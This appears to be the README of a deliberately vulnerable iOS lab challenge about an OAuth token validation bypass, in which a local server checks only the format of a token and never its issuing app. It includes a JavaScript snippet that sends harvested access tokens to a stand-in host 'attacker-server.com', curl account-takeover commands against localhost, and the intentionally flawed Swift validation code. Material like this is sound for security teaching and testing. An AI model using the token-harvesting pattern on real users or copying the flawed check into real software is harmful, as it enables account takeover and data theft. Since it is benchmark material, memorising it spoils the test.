# oxo-ios-ben20: OAuth Token Validation Bypass

## Challenge Details

### Description

SocialShare Hub is a modern iOS social media management application that allows users to connect multiple social media accounts (Facebook, Twitter) for unified content management. The app features a clean, professional interface with native iOS social login integration and a comprehensive dashboard for managing connected accounts.

The application demonstrates a critical **OAuth Token Validation Bypass** vulnerability where the backend API fails to properly validate that OAuth access tokens were issued specifically for the app's registered OAuth application. This allows attackers to use access tokens from their own malicious applications to authenticate as any user who has used those applications.

Key features of the application:
- Native iOS social media authentication (Facebook, Twitter)
- Professional social media management dashboard
- Real-time OAuth token validation via local HTTP server
- Connected accounts management interface
- Social activity feed simulation

### Vulnerability Type and Category
- **Type:** OAuth Token Validation Bypass / Account Takeover
- **Category:** Authentication Bypass (CWE-287)
- **Platform:** iOS (Swift/UIKit) 

### Difficulty
Medium

## Vulnerability Overview

The application's OAuth authentication system processes social media access tokens without verifying that tokens were issued for the legitimate SocialShare Hub application. This vulnerability affects the local OAuth API server (`VulnerableOAuthServer.swift`) where user-provided access tokens are validated only for format correctness, not application origin.

**Attack Vector: OAuth App Origin Bypass**

**Brief Explanation**: SocialShare Hub's OAuth API endpoint `/api/auth/social` accepts Facebook and Twitter access tokens and validates only their format (e.g., Facebook tokens starting with "EAA") but never verifies the tokens were issued for SocialShare Hub's registered OAuth application ID.

## Exploitation

### Attack Scenario

**1. Attacker Setup**
- Attacker creates malicious Facebook/Twitter app (e.g., "Fun Quiz App")
- Legitimate users authenticate to attacker's app, generating access tokens
- Attacker collects tokens on their server from users who granted permissions

**2. Token Harvesting**
```javascript
// Attacker's malicious web app collects tokens
function collectUserToken(accessToken, userID) {
    // Store token associated with user for later use
    fetch('https://attacker-server.com/collect', {
        method: 'POST',
        body: JSON.stringify({
            token: accessToken,
            user_id: userID,
            source: 'facebook'
        })
    });
}
```

**3. Account Takeover**
```bash
# Attacker uses harvested tokens to authenticate to SocialShare Hub
curl -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "EAABwzLixnjYBO5wZCZBuiQBAK7lZCcVZCZCpqZCLQ..."
  }'

# Response: Successfully authenticates as the token owner
{
  "success": true,
  "user": {
    "id": "fb_123456789",
    "name": "Sarah Johnson", 
    "email": "sarah.johnson@email.com",
    "provider": "facebook",
    "connected_accounts": ["Facebook", "Instagram"]
  }
}
```

### Testing Instructions

#### Legitimate User Authentication

1. **Start the app** in iOS Simulator (OAuth server starts automatically)
2. **Test normal authentication** by tapping "Continue with Facebook"
3. **Enter valid credentials** when prompted:

| Email | Password |
|-------|----------|
| sarah.johnson@email.com | password123 |
| mike.chen@email.com | password456 |
| emma.williams@email.com | password789 |

4. **App authenticates successfully** with legitimate SocialShare Hub token

#### Vulnerability Exploitation

**Scenario:** Attacker has stolen tokens from malicious "Fun Quiz App"

5. **Use stolen tokens** to bypass authentication entirely:

```bash
# Stolen token from "Fun Quiz App" - should only work for Quiz App
curl -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "EAABwzLixnjYBOsarah123collected456from789quiz"
  }'

# Another stolen token for different user
curl -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "EAABwzLixnjYBOmike456collected789from123quiz"
  }'
```

#### Stolen Tokens for Testing

Use these tokens representing victims of the malicious "Fun Quiz App":

| User | Stolen Token |
|------|-------------|
| Sarah Johnson | `EAABwzLixnjYBOsarah123collected456from789quiz` |
| Mike Chen | `EAABwzLixnjYBOmike456collected789from123quiz` |
| Emma Williams | `EAABwzLixnjYBOemma789collected123from456quiz` |

**Expected Result:** 
- ✅ **Legitimate credentials**: Work through proper Facebook OAuth flow
- ⚠️ **Stolen tokens**: Also work despite being issued for different app (vulnerability!)
- ❌ **Random tokens**: Fail validation (realistic behavior)

## Technical Details

### Vulnerable Code Locations

**Primary Vulnerability - VulnerableOAuthServer.swift:122-140**
```swift
// VULNERABLE: Token validation bypass
private func validateTokenFormat(_ token: String, provider: String) -> Bool {
    switch provider.lowercased() {
    case "facebook":
        // Only check format, NOT app origin (vulnerability!)
        return token.hasPrefix("EAA") && token.count > 20
    case "twitter":
        return token.count > 20 && token.allSatisfy { $0.isLetter || $0.isNumber || $0 == "-" || $0 == "_" }
    default:
        return false
    }
}
```

**Missing Validation - Should Include App ID Verification:**
```swift
// SECURE (not implemented): Should validate token belongs to our app
func validateTokenBelongsToApp(_ token: String, provider: String) -> Bool {
    // Should verify token was issued for SocialShare Hub's OAuth app ID
    // Facebook: Check token's app_id matches registered application
    // Twitter: Verify token's client_id matches registered application
    return false // This validation is missing - vulnerability!
}
```

**OAuth Authentication Handler - VulnerableOAuthServer.swift:95-120**
```swift
// CRITICAL FLAW: Accepts any valid-format token from any OAuth app
let isValidToken = validateTokenFormat(accessToken, provider: provider)

if isValidToken {
    // Authenticates user without verifying token origin
    let userData = selectUserForToken(provider: provider, token: accessToken)
    // Account takeover successful!
}
```

### Application Architecture
- **Language**: Swift 5.9+
- **Framework**: UIKit with Storyboard navigation
- **Networking**: Foundation URLSession + Local NWListener server
- **OAuth Simulation**: Local HTTP server on port 8080
- **UI Pattern**: Navigation controller with social login flow

### Key Components
- `SocialAuthService.swift` - OAuth token generation and API communication
- `VulnerableOAuthServer.swift` - Local server with token validation vulnerability
- `ViewController.swift` - Social login interface with server controls  
- `DashboardViewController.swift` - Post-authentication user management
- `Main.storyboard` - Professional social media app UI

### Real-World Impact

**Business Impact:**
- **Complete Account Takeover**: Attackers gain full access to victim's connected social media accounts
- **Data Harvesting**: Access to user profiles, connected services, and social activity
- **Lateral Movement**: Potential access to linked Instagram, LinkedIn, and other connected platforms
- **Scale Attack**: Single malicious app can compromise accounts across multiple legitimate services

**Attack Prerequisites:**
- Attacker creates legitimate-looking OAuth application (trivial)
- Users authenticate to attacker's app (social engineering)
- Target application uses vulnerable OAuth validation (common implementation mistake)

### Vulnerability Pattern

This vulnerability represents a common OAuth implementation flaw where developers:
1. **Assume token app-specificity** - incorrectly believe OAuth tokens are app-specific
2. **Focus on format validation** - validate token structure but ignore origin verification  
3. **Skip app ID verification** - don't confirm tokens belong to their registered OAuth application
4. **Trust external token sources** - accept tokens without proper provenance validation

**Root Cause:** OAuth access tokens are **user-specific, not app-specific** - the same user's token works across different OAuth applications unless explicitly validated for app origin.

## Impact Assessment

### Risk Level: HIGH

**Attack Scenarios:**
1. **Malicious App Distribution**: Attacker distributes popular mobile game/utility with Facebook login
2. **Social Engineering**: Users authenticate to attacker's app for legitimate-seeming purpose
3. **Token Harvesting**: Attacker collects access tokens from all users who authenticated
4. **Cross-App Authentication**: Attacker uses harvested tokens to authenticate to SocialShare Hub
5. **Account Control**: Full access to victims' social media management capabilities

**Potential Impacts:**
- **Identity Theft**: Access to personal information across connected social platforms
- **Social Media Compromise**: Ability to post, message, and manage victim's social presence
- **Business Account Takeover**: Access to connected business social media accounts
- **Privacy Violation**: Exposure of private messages, photos, and social connections
- **Reputation Damage**: Malicious posts/messages sent from compromised accounts